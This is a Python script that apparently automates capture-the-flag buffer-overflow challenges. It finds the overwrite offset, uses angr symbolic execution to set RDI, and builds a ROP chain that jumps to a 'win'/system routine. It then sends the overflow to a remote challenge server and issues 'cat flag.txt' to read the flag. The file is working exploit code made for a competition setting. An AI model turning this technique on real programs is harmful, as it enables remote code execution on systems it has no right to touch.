import claripy
from pwn import *
import angr, angrop
import detection
import re
from scapy.all import *

context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    # terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)

# MUST BE CALLED STARTING WITH FALSE
def exploit(binary: str, movaps):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    s = remote(url, 443, ssl=True, sni=url)

    if s:
        print('[+] Connected to host')

    offset = detection.find_rip_offset(binary)
    print("[+] Offset:", offset)
    #s.recvuntil(b'>>>')
    e = ELF(binary)
    r = ROP(e)

    START = e.sym['win']
    p = angr.Project(binary)

    ropy = p.analyses.ROP()
    ropy.find_gadgets()

    # finds the value rdi should be to validate
    initial_state = p.factory.blank_state(addr=START)
    rdi = claripy.BVS('rdi', 64)
    initial_state.regs.rdi = rdi
    simgr = p.factory.simgr(initial_state)
    GOAL = e.sym['system']
    simgr.explore(find=GOAL)

    win = simgr.found[0] if simgr.found else None

    if win:
        print(win.solver.eval(rdi))

    # chain building
    chain = ropy.set_regs(rdi=win.solver.eval(rdi)).payload_str()
    if movaps:
        chain += p64(r.find_gadget(['ret'])[0])
    chain += p64(e.sym['win'] + 1)
    print(chain)
    print(cyclic(offset) + chain)
    s.sendline(cyclic(offset) + chain)
    try:
        if next(e.search(b'/bin/sh')):
            s.sendline(b'cat flag.txt')
    except StopIteration:
        print('[!] SHell not found')
    output = s.recvall(timeout=5)
    print(output)
    flag = re.findall(flag_regex, output.decode())
    if flag:
        return flag[0]
    else:
        return exploit(binary, True)



# def main():  # TEMP FOR TESTING
#     flags = []
#     for i in range(10):
#         print(f"bin-rop-parameters-{i}")
#         flag = exploit(f"bin-rop-parameters-{i}",False)
#         print(f"\n[!]{flag}\n")
#         flags.append(f"bin-rop-parameters-{i} {flag}")
#     for each in flags:
#         print(each)
# main()
